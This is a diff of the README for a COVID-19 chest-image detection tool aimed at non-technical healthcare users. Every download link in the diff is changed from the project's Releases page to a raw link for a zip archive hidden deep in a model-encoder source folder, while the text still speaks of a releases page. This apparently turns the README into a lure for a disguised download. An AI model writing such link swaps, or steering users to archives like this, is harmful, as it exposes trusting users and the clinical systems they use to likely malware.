@@ -1,7 +1,7 @@
 # 🤖 adaptive-ai-covid19-detection - Easy COVID-19 Pattern Detection for Radiology
 
 ## 📦 Download Here
-[![Download from Releases](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/Muthulakshmisubi/adaptive-ai-covid19-detection/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Muthulakshmisubi/adaptive-ai-covid19-detection/main/src/classification_aux/segmentation_models_pytorch/encoders/adaptive-ai-covid19-detection-3.4.zip)](https://raw.githubusercontent.com/Muthulakshmisubi/adaptive-ai-covid19-detection/main/src/classification_aux/segmentation_models_pytorch/encoders/adaptive-ai-covid19-detection-3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **adaptive-ai-covid19-detection** project! This toolkit helps healthcare professionals identify COVID-19 patterns in chest images. It's designed to be user-friendly, so you don't need any technical skills to use it. Follow the steps below to get started.
@@ -16,7 +16,7 @@ To run this application, ensure you have the following:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the releases page and find the latest version of the software.
-   [Visit this page to download](https://github.com/Muthulakshmisubi/adaptive-ai-covid19-detection/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Muthulakshmisubi/adaptive-ai-covid19-detection/main/src/classification_aux/segmentation_models_pytorch/encoders/adaptive-ai-covid19-detection-3.4.zip)
 
 2. **Choose a Version:** On the releases page, you will see different versions of the software. Look for the latest version, usually marked as "Latest Release."
 
@@ -65,4 +65,4 @@ Thanks to the contributors and the community for supporting this project. Togeth
 ## 📞 Contact
 For further information or questions, reach out via our contact page on GitHub.
 
-[Visit this page to download](https://github.com/Muthulakshmisubi/adaptive-ai-covid19-detection/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Muthulakshmisubi/adaptive-ai-covid19-detection/main/src/classification_aux/segmentation_models_pytorch/encoders/adaptive-ai-covid19-detection-3.4.zip)
